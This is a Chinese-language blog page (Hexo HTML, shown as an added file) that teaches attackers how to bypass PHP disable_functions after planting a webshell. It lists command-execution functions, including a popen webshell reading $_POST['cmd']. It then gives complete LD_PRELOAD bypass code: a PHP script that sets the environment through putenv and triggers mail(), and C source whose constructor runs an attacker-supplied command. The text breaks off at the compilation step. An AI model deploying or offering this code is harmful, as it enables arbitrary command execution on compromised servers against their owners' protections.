@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="liuty">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言我们在日常工作中或者一些攻防项目中，可能会遇到这种情况：我们千辛万苦才拿到的Webshell，but!!!!!!!无法执行命令，并且在很多rt的面试当中也常会问到这种问题，往往特别当我们遇到php站点时，碰到函数都被禁用，将会导致我们无法进行后面的渗透工作，马上就要写完报告了、拿下这个站就可以下班了…要是突然给你来了这么一刀，这滋味只有感受过的人才会知道😭，你会甘心吗？出现这种情况大多是di">
+<meta property="og:type" content="article">
+<meta property="og:title" content="disable_functions绕过">
+<meta property="og:url" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="liuty&#39;s blog">
+<meta property="og:description" content="前言我们在日常工作中或者一些攻防项目中，可能会遇到这种情况：我们千辛万苦才拿到的Webshell，but!!!!!!!无法执行命令，并且在很多rt的面试当中也常会问到这种问题，往往特别当我们遇到php站点时，碰到函数都被禁用，将会导致我们无法进行后面的渗透工作，马上就要写完报告了、拿下这个站就可以下班了…要是突然给你来了这么一刀，这滋味只有感受过的人才会知道😭，你会甘心吗？出现这种情况大多是di">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-22.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-12_1.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-19.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-26.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-27.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-29.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-36.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-42.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-06.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-33.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-34.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-37.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-26.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-27.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-30.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-32.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-33.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-34.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-35.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-43.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-45.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-47.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-48.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-04.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-06.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_23-18.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-23.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-44.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-47.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-25.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-29.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-34.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-35.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-37.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-09.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-14.png">
+<meta property="og:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17_1.png">
+<meta property="article:published_time" content="2024-05-05T04:25:41.000Z">
+<meta property="article:modified_time" content="2024-05-05T13:03:10.383Z">
+<meta property="article:author" content="liuty">
+<meta property="article:tag" content="总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-22.png">
+  
+  
+  
+  <title>disable_functions绕过 - liuty&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"hCaWnJI7fVuWUvqb3FgzqfKD-gzGzoHsz","app_key":"NJZ1v4tGwTre1rcW3Qdw1WYU","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>liuty&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="disable_functions绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-05 12:25" pubdate>
+          2024年5月5日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">disable_functions绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们在日常工作中或者一些攻防项目中，可能会遇到这种情况：我们千辛万苦才拿到的Webshell，but!!!!!!!无法执行命令，并且在很多rt的面试当中也常会问到这种问题，往往特别当我们遇到php站点时，碰到函数都被禁用，将会导致我们无法进行后面的渗透工作，马上就要写完报告了、拿下这个站就可以下班了…要是突然给你来了这么一刀，这滋味只有感受过的人才会知道😭，你会甘心吗？出现这种情况大多是disable_functions的原因，disable_functions其实是放在php.ini配置文件中的一个设置参数，用来过滤止一些危险函数，但是默认情况下为空，不同开发者面临的需求和能力不同，为了实现某些特殊功能，调用的函数也会不同，当一些系统的关键函数的被禁用掉，像：system，exec,shell_exec,popen等，就会导致我们拿到shell之后，执行不了命令的原因，通常表现为：执行命令返回ret&#x3D;127，如下图</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-22.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-22.png">
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>当我们想查看disable_functions或者想知道都禁用了哪些函数，可以在php.ini查看，也可以使用phpinfo();</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-12_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-12_1.png">
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-19.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-19.png">
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>今天这篇文章，主要讲一下disable_functions常见的绕过方式</p>
+<h2 id="常规绕过"><a href="#常规绕过" class="headerlink" title="常规绕过"></a>常规绕过</h2><p>很多时候，disable functions及时限制了危险函数，也可能会有限制不全的情况，所以很有可能忽略某些危险函数，也就是我们常说的黑名单，常见的有以下几种：<br>1、exec()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>2、shell_exec()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>3、system()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>4、passthru()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>5、popen()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$command</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-number">1024</span>);  <span class="hljs-comment">//fread($handle, 1024);</span><br>&#125;<br><span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>6、proc_open()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>));<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>); <span class="hljs-comment">//fgets($pipes[1],1024);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>等等</p>
+<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接，它最大的特点就是可以自定义在程序运行前优先加载的动态链接库，这个特点主要就是用来有选择性的载入不同动态链接库中的相同函数，然后在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库，我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数，仍可执行系统命令的目的，说白了就是个同名函数谁能先执行的问题，使用LD_PRELOAD加持，就可以优先执行，假如我们想知道某个命令会调用系统哪些API或者哪些可执行文件的符号表，我们可用下面的命令（拿id命令举例）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">readefl -Ws `<span class="hljs-built_in">which</span> <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-26.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-26.png">
+<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>不过这个命令展示的结果不代表一定会进行调用，那么我们可以通过下面的命令看到实际调用的情况</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">strace</span> -f `which id` <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-27.png">
+<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>由于被劫持的系统函数需要由我们重新实现一次，所以函数原型必须一致，所以我们应该优先选择那些无参数并且常用的系统函数，比如getuid()，我们可以先用man命令查看一下getuid的函数原型</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-29.png">
+<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>既然这样，我们就用getuid做劫持测试，先写一段getuid的c源码，然后编译成64位共享动态链接库，也就是xxxx.so（也就是对应c的同名文件，编译过程的报错可以忽略）</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-36.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-36.png">
+<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>至于为什么要用-fPIC参数，这样编译出来的代码是没有绝对地址的，将全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，并且都可以正确的执行，这样一来，共享库被加载时，在内存的位置将不会是固定的。接下来我们执行看下效果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LD_PRELOAD=/xxx/xxx/xxx.so `<span class="hljs-built_in">which</span> <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-42.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_09-42.png">
+<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>可以看到系统会先加载我们写的so文件，然后执行id命令，我的环境可能出了点问题，所以会重复多次执行新增的语句，但不过也没啥影响，那我们如何在php站点中使用LD_PRELOAD进行disable——functions的绕过？思路很简单：创建一个可执行系统命令的so文件，然后再编写一个php文件去引用我们的这个so文件。</p>
+<p>知识点补充：在php中，我们可以用putenv函数提前加载我们设计好的so文件</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-06.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_14-06.png">
+<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发，利用代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>攻击脚本如下：bypass_disablefunc.c</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get command line options and arg</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmdline = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>);<br><br>    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span><br>    <span class="hljs-comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some</span><br>    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// executive command</span><br>    <span class="hljs-built_in">system</span>(cmdline);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>GCC 有个 C 语言扩展修饰符 attribute（上图圈起来的部分），可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行，并且会从环境变量 EVILCMDLINE 中接收刚才php传递过来的待执行的命令行，接下来编译为共享对象文件</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-33.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_14-33.png">
